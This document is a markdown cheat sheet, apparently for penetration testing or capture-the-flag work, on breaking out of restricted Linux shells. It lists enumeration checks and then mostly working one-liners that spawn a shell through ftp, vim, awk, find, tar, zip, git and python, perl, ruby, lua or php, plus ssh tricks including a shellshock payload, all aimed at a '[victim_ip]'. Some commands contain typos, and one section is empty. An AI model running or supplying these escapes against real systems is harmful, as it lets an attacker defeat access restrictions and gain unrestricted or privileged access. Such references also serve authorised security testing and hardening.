### Test 
```
ssh user_name@[victim_ip] bash
```

### Enumarate 
- command 
  - cd
  - ls
  - echo

- operators 
  - *>*
  - *<*
  - *>>*
  - *|*

- programming languages
  - perl
  - ruby
  - python
  - php
  
- commands as root
  - sudo -l

- check files with suid

- check env variable
  - run env
  - printenv

- check shell
  - echo $SHELL
  
### Common Techniques
- */* run /bin/sh or /bin/bash
- *cp* copy /bin/sh or /bin/bash into your directory
- *ftp* run ftp>!/bin/bash or ftp>!/bin/sh
- *gdb* run gdb>!/bin/bash or gdb>!/bin/sh
- *vim* run vim>!/bin/bash or vim>!/bin/sh
- *rvim* run rvim>:python import os;os.system("bin/bash")
- *scp* run scp>scp -S /path/your/script x y:
- *awk* run awk>awk 'BEGIN {system("/bin/sh or /bin/bash")}
- *find* run find>find / -name test -exec /bin/sh or /bin/bash \;

### Programming Languages Techniques
- *except* run except> except spawn sh thne sh
- *python* run python -c 'import os;os.system("/bin/sh")'
- *php* run php>php -a then exec("sh -i");
- *perl* run perl>perl -e 'exec"/bin/sh";'
- *lua* run lua>os.execute('/bin/sh')
- *ruby* run ruby>exec "/bin/sh"

### Advance Techniques
- *ssh* run ssh>ssh username@IP - t "/bin/sh" or "/bin/bash"
- *ssh2* run ssh2>ssh username@IP -t "bash --noprofile"
- *ssh3* run ssh3>ssh username@IP -t "() { :; }; /bin/bash" (shellshock)
- *ssh4* run ssh4>ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)
- *tar* run tar>tar cf /dev/null testfile --checkpoint=1 --checkpoint- action=exec=/bin/bash
- *zip* run zip>zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
- *pico* run pico>pico -s "/bin/bash" then you can write /bin/bash and then CTRL + T
- *git* run git>git help status > you can run it then !/bin/bash

### PATH override


### References
- https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
